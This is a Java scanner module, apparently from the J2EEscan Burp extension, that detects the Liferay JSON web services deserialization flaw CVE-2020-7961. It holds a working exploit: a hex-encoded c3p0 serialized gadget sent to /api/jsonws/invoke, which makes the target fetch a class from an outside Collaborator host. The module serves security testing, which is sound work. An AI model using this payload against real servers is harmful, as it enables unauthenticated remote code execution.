package burp.j2ee.issues.impl;

import java.net.MalformedURLException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import java.io.File;
import java.io.PrintWriter;
import java.math.BigInteger;
import java.net.URL;

import burp.CustomHttpRequestResponse;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.annotation.RunOnlyOnce;
import burp.j2ee.issues.IModule;

public class LiferayJSONDeserializationCVE20207961 implements IModule{
    

    private static final String TITLE = "Liferay (CVE-2020-7961): RCE - JSON Deserialization";
    private static final String DESCRIPTION = "J2EEscan identified a vulnerable installation"
            + " of Liferay. The vulnerability allow unauthenticated remote code execution via" 
            + " the JSON web services API.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/id/117954271<br />"
            + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7961";

    private static final String REMEDY = "Update the software with the last security patches"
            + " or disable the JSON web services API";

    private static final String PATH = "/api/jsonws/invoke";

    private IExtensionHelpers helpers;
    private PrintWriter stderr;

    private String PAYLOAD_PREFIX = "aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e63654" + 
                                    "96e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200" +
                                    "044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c000" +
                                    "3656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e0001" +
                                    "4c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7" +
                                    "870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d0902" +
                                    "00044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c6173734" +
                                    "66163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c61737346616374" +
                                    "6f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106" +
                                    "a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e" +
                                    "6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135" +
                                    "b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e" +
                                    "6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707" + 
                                    "874000a5061796c6f61644f626a74003a",
                    PAYLOAD_SUFIX = "740003466f6f";
    
    @RunOnlyOnce
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        List<IScanIssue> issues = new ArrayList<>();

        helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            
        String payload = PAYLOAD_PREFIX + 
            String.format("%040x", new BigInteger(1, helpers.stringToBytes("http://" + currentCollaboratorPayload))) + 
            PAYLOAD_SUFIX;
    
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost(), protocol = url.getProtocol();
        int port = url.getPort();
        Boolean useHttps = protocol.equals("https");
        
        try {   
            URL urlMod = new URL(protocol, host, port, PATH);
            byte[] request = helpers.buildHttpRequest(urlMod);
            request = helpers.toggleRequestMethod(request);
           
            List<IParameter> par = Arrays.asList(
                helpers.buildParameter("cmd", "%7B%22%2Fexpandocolumn%2Fadd-column%22%3A%7B%7D%7D", IParameter.PARAM_BODY),
                helpers.buildParameter("p_auth", "ZkABM2UK", IParameter.PARAM_BODY),
                helpers.buildParameter("formDate", String.valueOf(System.currentTimeMillis()), IParameter.PARAM_BODY),
                helpers.buildParameter("tableId", "1", IParameter.PARAM_BODY),
                helpers.buildParameter("name", "1", IParameter.PARAM_BODY),
                helpers.buildParameter("type", "1", IParameter.PARAM_BODY),
                helpers.buildParameter("%2BdefaultData:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource", 
                    "{\"userOverridesAsString\":\"HexAsciiSerializedMap:" + payload + ";\"}", IParameter.PARAM_BODY)
            );

            for(IParameter p : par){
                request = helpers.addParameter(request, p);
            }
	
            byte[] response = callbacks.makeHttpRequest(host, port, useHttps, request); 

            List<IBurpCollaboratorInteraction> collaboratorInteractions
            = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

            if(!collaboratorInteractions.isEmpty()){
                issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(), 
                            urlMod, 
                            new CustomHttpRequestResponse(request, response, baseRequestResponse.getHttpService()),
                            TITLE, 
                            DESCRIPTION, 
                            REMEDY,
                            Risk.High, 
                            Confidence.Firm
                        ));
            }

        } catch (MalformedURLException ex) {
            stderr.println("Malformed URL Exception: " + ex);
        }

        return issues;
    
    }
    
}